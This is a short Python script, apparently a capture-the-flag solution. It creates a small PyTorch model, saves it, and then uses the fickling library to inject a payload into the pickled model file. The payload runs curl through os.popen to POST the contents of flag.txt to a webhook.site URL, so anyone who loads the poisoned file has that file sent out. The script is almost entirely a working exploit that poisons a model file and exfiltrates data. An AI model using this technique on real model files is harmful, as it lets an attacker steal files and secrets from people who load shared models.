from fickling.pytorch import PyTorchModelWrapper
import torch
import io
import sys
import torch.nn as nn

class VeryCoolModel(nn.Module):
    def __init__(self, input_size=10, hidden_size=16, output_size=2):
        super(VeryCoolModel, self).__init__()
        self.fc1 = nn.Linear(input_size, hidden_size)  # First layer
        self.relu = nn.ReLU()  # Activation
        self.fc2 = nn.Linear(hidden_size, output_size)  # Output layer

    def forward(self, x):
        x = self.fc1(x)
        x = self.relu(x)
        x = self.fc2(x)
        return x


model = VeryCoolModel()

torch.save(model, "model.pt")

# Wrap model file into fickling
result = PyTorchModelWrapper("model.pt")


cmd = """
import os
os.popen('curl -X POST -d "flag_content=$(cat flag.txt)" https://webhook.site/f73986dc-30ac-4792-b562-1ed3668c1ee3').read().strip()
"""


# Inject payload, overwriting the existing file instead of creating a new one
temp_filename = "temp_filename.pt"
result.inject_payload(
    cmd,
    temp_filename,
    injection="insertion",
    overwrite=True,
)
